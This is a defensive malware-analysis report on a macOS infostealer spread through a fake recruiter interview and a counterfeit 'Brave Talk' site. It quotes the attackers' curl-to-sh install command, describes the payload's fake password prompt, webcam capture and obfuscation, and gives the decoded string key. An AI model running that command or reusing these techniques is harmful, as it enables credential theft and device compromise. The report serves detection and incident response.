# Saifuro / "Brave Talk" macOS malware — forensic report

**Date:** 2026-11-03  ·  **Analyst box:** isolated Hetzner VM (188.34.195.98), outbound-firewalled, nothing executed  ·  **Target:** macOS infostealer delivered through a fake job interview.

## 1. Executive summary

A fake recruiter ("Saifuro LLC", a Wyoming shell pitching an "AI agent payments" startup) ran a job interview and, 15 minutes before the call, sent a Calendly "join" link pointing not to a real meeting but to `talkbrave.org`, a counterfeit of Brave's `talk.brave.com`. The page covertly photographs the candidate through the webcam, then shows a fake "you need the desktop app" error and offers a macOS download: either a `.dmg` or a copy-paste `curl … | sh` command. Both deliver the same second-stage Mach-O (an infostealer in the `cloudsync_impl` C++ namespace) that pops a fake macOS password prompt, saves the captured password, writes an `auth.json`, disguises its process and persists. This is the North-Korea-linked "Contagious Interview" playbook (assessed ~80% confidence, below).

**No code ran on the owner's Mac.** The link was never opened there; all analysis was done on an isolated Linux box.

## 2. Kill chain (observed, plaintext)

1. Recruiter lure + Calendly reminder email with a join link.
2. `https://talkbrave.org/meet/<id>?p=<code>` — fake "Brave Talk" prejoin page.
3. Page JS asks for camera+mic, silently draws a webcam frame to a canvas and POSTs the JPEG to `/evidence/<code>`. Russian-language developer comments in the JS.
4. Fake "Connecting…" then a fabricated error: "Joining a Brave Talk Premium meeting requires the Brave Talk desktop app."
5. Download button → `GET /teams/retreive/<code>/` → `{"link":"https://macos.talkbrave.org/?dlid=<uuid>"}` (one-time, cloaked; 404 to anyone who doesn't match the victim session).
6. macOS portal offers **(a)** `BraveTalk.dmg` from `https://m.fallproject.com/us-east/cdn1?call=BraveTalk` and **(b)** `curl https://macos.talkbrave.org/apple/macos/install/interactive/bash | sh`.
7. `install.sh` (variable-name-obfuscated) downloads `/unix/<uuid>` as `package.tar.gz` using `curl -fsSLk` (the `-k` disables TLS cert checking), untars, `chmod +x`, and `exec`s the first executable. A fake 10-step progress bar with `sleep 0.2` adds realism.
8. Executed payload = `installer` (universal x86_64+arm64 Mach-O). The DMG path drops `BraveTalk.app` containing `cshelper` (777 KB) + `app_installer`.

## 3. Capability analysis (inferred from symbols, classes, frameworks, strings)

- **Fake password theft.** Objective-C class `AuthDialog` with `usernameField` / `passwordField` (`NSSecureTextField`), OK/cancel handlers; C++ `cloudsync_impl::save_local_password(...)` and `create_auth_json(...)` writing to an `auth.json` path. A dialog that imitates the macOS system password prompt to capture the login/keychain password. *(inference from naming)*
- **Exfil over TLS with validation disabled.** `CSURLInsecureDelegate`, `cs_accept_server_trust`, `cs_set_empty_http_body`, `cs_url_session*`, plus the installer's `curl -k`: HTTP(S) client that accepts any certificate, so a self-signed C2 works and interception is easy. *(inference)*
- **Config hidden by compile-time obfuscation.** `cloudsync_impl::sobf::reveal`, per-length `CTEnc<N>::str`, a key `sobf::K`, and `_ct_APP_*` constants decrypt the real strings only at runtime. The C2 URL and install paths are therefore **not** recoverable statically. Symbol names seen among the config set include `APP_OPS_URL`, `APP_CHACHA_KEY`, `APP_OPS_CHACHA_IV`, `APP_INSTALL_DIR`, `APP_DAEMON_NAME`, `APP_PROCESS_DISGUISE_NAME`, `APP_SUFFIX_SH`, `APP_CONFIG_SUBDIR`, `APP_TMP_APP_SWAP_PREFIX`, `APP_TMP_SPAWN_S_PREFIX`. ChaCha-encrypted operator config. *(inference)*
- **Persistence & disguise.** `APP_INSTALL_DIR`, `APP_DAEMON_NAME`, `APP_PROCESS_DISGUISE_NAME`, a `.sh` suffix, tmp swap/spawn prefixes, single-instance locking (`installer_lock*`, `daemon_flock_held`, `daemon_lock_rel`) so only one copy runs and it masquerades as a benign "cloudsync" helper. *(inference)*
- **Anti-analysis.** `generate_filler(len,len)` with its own RNG + mutex (junk padding to vary hashes / frustrate signatures); `zwc::encode_byte` / `encode_range` = zero-width-character encoding (hiding markers in text or filenames); `magic::encode`; `embedded_gate_data` (an embedded blob / environment gate). *(inference)*
- **GUI theatre.** `AppDel` with `runWorkflow` / `runTerminalWorkflow` / `runFastWorkflow`, `ModernStatusWindow updateStatus:progress:`, `AlertButtonHandler` — a believable install UI that tracks whether the victim came via the DMG or the Terminal one-liner.
- **Frameworks:** Cocoa, AppKit, Security, Foundation, QuartzCore + libc++/libobjc. Built against macOS SDK 14.0, minimum macOS 13.0, arm64 + x86_64. Code-signed (ad-hoc / unknown authority).

## 4. MITRE ATT&CK mapping

| Technique | ID | Evidence |
|---|---|---|
| Phishing: Spearphishing via Service | T1566.003 | Fake recruiter + Calendly interview lure |
| User Execution: Malicious Image / Link | T1204.001/.002 | DMG and `curl \| sh` one-liner |
| Input Capture: GUI Input Capture | T1056.002 | `AuthDialog` fake password prompt |
| Credentials from Password Stores: Keychain | T1555.001 | `save_local_password`, `create_auth_json` |
| Video Capture | T1125 | webcam JPEG → `/evidence/<code>` |
| Obfuscated/Encrypted Files or Info | T1027 | `sobf::reveal`, ChaCha config, zero-width encoding |
| Masquerading: Match Legitimate Name | T1036.005 | "Brave Talk", "cloudsync" disguise |
| Subvert Trust Controls / weak TLS | T1553 | `CSURLInsecureDelegate`, `curl -k` |
| Persistence (launch agent/daemon) | T1543 | `APP_DAEMON_NAME`, install dir, `.sh` suffix |
| Exfiltration Over C2 Channel | T1041 | `APP_OPS_URL` + insecure URLSession |

## 5. Attribution (independent reasoning, DeepSeek V4)

**~80% confidence this matches the DPRK-nexus "Contagious Interview" operation** (vendor clusters Famous Chollima / BlueNoroff / Jade Sleet), described as "likely DPRK-nexus, but not attribution-grade from static evidence alone."

- **For:** fake recruiter → fake interview → fake meeting app; impersonation of a real meeting product; dual DMG + `curl|sh` delivery; fake macOS password prompt for the keychain; covert webcam capture; "cloudsync" disguise; zero-width-char and ChaCha obfuscation — all core DPRK macOS tradecraft.
- **Against / ambiguous:** Russian-language comments in the web JS (strongest counter-signal: reused commodity JS, a Russian-speaking dev, or a false flag); Cloudflare fronting and the `fallproject.com` CDN are generic; no decrypted C2 to tie to known DPRK infrastructure.
- **What would confirm:** decrypting the `sobf`/ChaCha config to recover C2 and matching it, or code/YARA overlap with known DPRK samples, or passive-DNS overlap with prior job-lure domains.

## 6. What the operators do with it

- **Stolen Mac password:** unlock the login keychain → saved browser logins, cookies/session tokens, SSH keys, VPN creds, crypto secrets; `sudo` and persistence if admin.
- **Webcam photo:** victim verification, impersonation prep, follow-up spear-phishing, extortion.
- **Execution on a PM/exec laptop:** browser session + wallet theft, MFA bypass via stolen cookies, corporate SaaS/VPN access, BEC and invoice fraud. DPRK monetisation is primarily crypto theft and fraud.

## 7. Indicators of compromise

**Domains / infra (all Cloudflare-fronted, 188.114.96.6 / 188.114.97.6):**
`talkbrave.org`, `macos.talkbrave.org`, `m.fallproject.com`, `fallproject.com`, recruiter `saifuro.com` (+ `docs.`, `verdicts.`).

**URL patterns:** `/meet/<id>?p=<code>`, `/teams/retreive/<code>/`, `/evidence/<code>` (POST webcam JPEG), `/unix/<uuid>` (tar.gz), `/apple/macos/install/interactive/bash`.

**SHA-256:**
```
782f21b0ce945931bab8b1d84dc57d542a510ec66b80f9034fefd04dcd53572b  installer (2nd stage)
8380cf9369598e292bb8403460f183fd038cb25288f57eccc42c4fc8e6f4399c  BraveTalk.dmg
8ad8a7388f19028846f89faa3c9f205a3eb39b5095f6cb8cb44a9b9b1f2eea66  package.tar.gz
6203255053fad3014a6dc8afcff811b309c4fdf3fd223fc2da80531915a5ce65  install.sh
```

## 8. Remediation

**If you did NOT run it (the owner's case):** no execution, so no infection. If you granted camera/mic on the page, a webcam still and a mic-on event were sent; revoke the site's permissions, close it, clear its site data, delete any download. Treat it as a privacy and follow-up-phishing risk, not an infection.

**If you HAD run the one-liner or opened the DMG, or typed your password into any popup:** treat the Mac as compromised. From a different trusted device, change your Apple ID / Mac login password, email, and crypto/exchange and employer SSO passwords, revoke active sessions, move any crypto with the seed on a clean device, and get professional incident response. Do not just "delete the app".

## 9. Next safe steps

1. Submit the four hashes to VirusTotal / MalwareBazaar and the domains/URLs to urlscan and passive-DNS; look for DPRK-sample overlap.
2. Report: Brave (brand abuse), Cloudflare abuse + registrars, FBI IC3 (ic3.gov) and Google/LinkedIn (fake recruiter). Warn peers.
3. Optional deeper RE in an offline sandbox: decrypt the `sobf`/ChaCha config to recover the live C2 (needed to confirm attribution).

*Static analysis only; external-model reasoning (DeepSeek V4) was used for attribution and verified against the evidence. Nothing in this report required running the sample.*

## 10. Reverse engineering results (Ghidra headless + radare2, offline on the isolated box)

**String obfuscation, fully reversed.** `cloudsync_impl::sobf::reveal()` is a custom XOR keyed by a 32-byte table K embedded in the binary:
```
plain[i] = cipher[i] XOR ((seed*0x83 + i*0x11) & 0xff) XOR K[seed & 31] XOR K[i & 31]
K = d719bf57e65ba09de1bacdb182c99118 edafd518fd3a4a9797bcad221adb8151
```
Each string carries its own one-byte `seed`. This is NOT the ChaCha routine; the ChaCha key/IV (`APP_CHACHA_KEY`, `APP_OPS_CHACHA_IV`) encrypt the exfil HTTP body, a separate layer.

**Config strings recovered** (decoded offline, no execution):
- user config dir name = `.config`  (seed 191)
- credential/exfil file name = `data.json`  (seed 211)

So the stolen data is staged at roughly `~/.config/<disguised>/data.json` before exfil. The remaining `_ct_APP_*` blobs (install dir, process-disguise name, instance lock, tmp swap/spawn prefixes, `.sh` suffix) use the same scheme and are recoverable with exact lengths.

**C2 endpoint, NOT recovered.** The network URL is built in `runWorkflow` from inline `cloudsync_impl::sobf::CTEnc<N>::str()` objects (sizes seen: 68, 44, 35, 35, 34, 15, 14, 10 bytes) whose keying differs from the global `_ct_APP_*` strings and did not fall to the same XOR. The literal C2 host is therefore still encrypted. Two ways to get it, both for a later focused pass: (a) reverse the `CTEnc` per-object key layout, or (b) extract the `cshelper` binary from `BraveTalk.app` (the HFS+ compression in the DMG defeated `7z`/`hpmount`; it needs a real `hdiutil`/macOS or `apfs-fuse`/`darling` to mount).

**Confirmed behaviours from decompilation:**
- `cs_url_session_configuration` calls `setHTTPCookieStorage:0` and `setHTTPShouldSetCookies:0` (no cookies, stateless beaconing), and `CSURLInsecureDelegate` + `cs_accept_server_trust` accept any TLS server trust (MITM-friendly, self-signed C2 works).
- `save_local_password` → `get_app_config_dir` → `create_directories` → `create_auth_json` → `ofstream` the file → `chmod 0644`: the fake password is written to disk, then exfiltrated.
- `create_auth_json` base64-encodes the captured input, pads with `generate_filler` random bytes, wraps with `zwc` zero-width encoding and `magic::encode`: obfuscated exfil envelope.
- `run_cmd` (two thunks) = shell command execution helper; `runWorkflow` / `runTerminalWorkflow` / `runFastWorkflow` branch on the DMG vs Terminal delivery path.
- Build: macOS SDK 14.0, min 13.0, arm64+x86_64, UUID D8889234-7422-3CA7-9A1F-759F99E597E9 (arm64 slice).

**Tooling used:** Ghidra 11.3.2 headless (`analyzeHeadless` + a Jython decompile script), radare2 5.5.0, llvm-objdump/llvm-nm, all on the firewalled Linux VM. Nothing was executed; every result is from static disassembly, decompilation, and offline data decoding.
